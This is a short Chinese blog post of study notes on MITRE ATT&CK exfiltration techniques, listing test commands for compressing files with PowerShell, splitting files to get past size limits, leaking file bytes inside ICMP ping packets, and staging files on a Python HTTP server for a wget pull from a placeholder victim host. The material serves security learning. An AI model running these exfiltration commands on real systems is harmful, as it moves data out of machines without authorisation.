---
layout: post
title: 跟着ATT&CK学安全之exfiltration
excerpt: "跟着ATT&CK学安全之exfiltration"
categories: [ATT&CK]
comments: true
---
#### T1002 - Data Compressed
##### 测试1 Compress Data for Exfiltration With PowerShell
```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
```
clean up
```
Remove-Item -path #{output_file}
```
其他的不列举了,都是一些简单的压缩命令,没有技术含量
#### T1022 - Data Encrypted
暂时不列举,就是一些带密码的压缩命令
#### T1030 - Data Transfer Size Limits
将文件分割,绕过大小限制
```bash
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l
```
#### T1048 - Exfiltration Over Alternative Protocol
##### Exfiltration Over Alternative Protocol - SSH

##### 通过ICMP协议传送数据
`$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }`
##### 通过Http协议传送数据
搭建http服务
```bash
cd /tmp/victim-staging-area && python -m SimpleHTTPServer 1337
```
下载
```bash
wget http://VICTIM_IP:1337/victim-file.txt
```